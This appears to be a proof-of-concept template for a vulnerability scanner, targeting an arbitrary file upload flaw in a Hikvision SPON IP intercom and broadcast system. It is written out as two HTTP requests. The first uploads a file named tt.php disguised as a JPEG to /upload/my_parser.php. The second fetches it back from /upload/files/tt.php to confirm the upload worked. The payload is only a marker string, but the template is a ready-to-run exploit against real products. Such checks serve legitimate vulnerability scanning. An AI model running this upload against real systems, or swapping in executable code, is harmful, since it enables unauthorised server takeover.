{
        'name': '海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/upload/my_parser.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8dsf2vRYZDVPaW9m'
            },
            'data': '------WebKitFormBoundary8dsf2vRYZDVPaW9m\r\nContent-Disposition: form-data; name="upload"; filename="tt.php"\r\nContent-Type: image/jpeg\r\n1111111\r\n------WebKitFormBoundary8dsf2vRYZDVPaW9m--',
            'dnslog': False,
            'sqltime': False,
            'filelocate': '/upload/files/tt.php'
        },
        'response': {
            'status_code': 200,
            'text': '1111111'
        }},
        {'requests':{
            'method': 'get',
            'payload': '/upload/files/tt.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '1111111'
        }}]
    }